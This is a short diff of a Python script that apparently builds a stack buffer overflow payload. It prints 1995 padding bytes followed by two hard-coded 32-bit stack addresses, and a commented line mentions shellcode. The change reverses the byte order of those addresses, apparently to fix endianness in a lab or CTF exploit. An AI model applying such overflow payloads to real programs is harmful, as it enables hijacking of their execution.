@@ -12,5 +12,5 @@ for i in range(1995):
     sys.stdout.write("a")
 #shellcode += '\xe8\xb0\xff\xbf\xfc\xb8\xff\xbf'
 #print(len(shellcode))
-sys.stdout.write("\xe8\xb0\xff\xbf")
-sys.stdout.write("\xfc\xb8\xff\xbf")
+sys.stdout.write("\xbf\xff\xb0\xe8")
+sys.stdout.write("\xbf\xff\xb8\xfc")
